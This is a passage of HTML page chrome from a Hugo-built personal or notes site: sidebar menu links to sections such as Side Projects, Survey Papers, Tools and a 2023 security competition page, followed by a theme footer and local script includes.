href=/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html>ç¥ç›¾ç›ƒ2023åˆè³½</a></li></ul></li><li data-nav-id=/side-project/index.html><a class=padding href=/side-project/index.html>Side Projects</a><ul id=R-subsections-3295de6e89859c4cf23a4292e734c881 class=collapsible-menu></ul></li><li data-nav-id=/survey-papers/index.html><a class=padding href=/survey-papers/index.html>Survey Papers</a><ul id=R-subsections-baa5a308e222e800d6e93248dad73a11 class=collapsible-menu></ul></li><li data-nav-id=/terminology/index.html><a class=padding href=/terminology/index.html>Terminologies</a><ul id=R-subsections-a19bf87a9a9aaf0a4146b803a35492f8 class=collapsible-menu></ul></li><li data-nav-id=/toc/index.html><a class=padding href=/toc/index.html>TOCs</a><ul id=R-subsections-451d3779340ac1afa8683c0232808cbf class=collapsible-menu></ul></li><li data-nav-id=/tools/index.html><a class=padding href=/tools/index.html>Tools</a><ul id=R-subsections-bf1399820dde3dd110e03ace4147ff86 class=collapsible-menu></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=/js/clipboard/clipboard.min.js?1743619851 defer></script><script src=/js/perfect-scrollbar/perfect-scrollbar.min.js?1743619851 defer></script><script src=/js/theme.min.js?1743619851 defer></script></body></html>